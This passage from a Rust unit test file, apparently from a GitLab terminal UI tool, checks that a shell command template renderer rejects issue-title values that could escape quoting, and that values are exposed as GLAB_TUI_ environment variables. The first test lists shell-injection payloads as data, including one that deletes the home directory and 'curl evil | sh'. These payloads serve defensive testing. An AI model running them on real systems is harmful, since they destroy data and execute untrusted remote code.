    fn render_refuses_values_that_could_escape_into_the_shell() {
        for hostile in [
            "x'; rm -rf ~ #",
            "$(curl evil | sh)",
            "`id`",
            "a && b",
            "a\nb",
            "say \"hi\"",
        ] {
            let result = render(
                "echo '{{.IssueTitle}}'",
                &values(&[("IssueTitle", hostile)]),
            );
            let error = result.expect_err(hostile);
            assert!(
                error.contains("\"$GLAB_TUI_ISSUE_TITLE\""),
                "error must point at the safe variable: {error}"
            );
        }
        assert_eq!(
            render(
                "echo {{.IssueTitle}}",
                &values(&[("IssueTitle", "[WIP] Fix crash #12, 100% done!")])
            )
            .as_deref(),
            Ok("echo [WIP] Fix crash #12, 100% done!")
        );
    }

    #[test]
    fn environment_exposes_available_values_under_glab_tui_names() {
        let mut values = values(&[("HeadRefName", "feat/a"), ("PrNumber", "7")]);
        values.insert_unavailable("RepoPath", "unknown".to_string());

        let environment: Vec<(String, &str)> = values.environment().collect();
        assert_eq!(
            environment,
            vec![
                ("GLAB_TUI_HEAD_REF_NAME".to_string(), "feat/a"),
                ("GLAB_TUI_PR_NUMBER".to_string(), "7"),
            ]
        );
    }
}
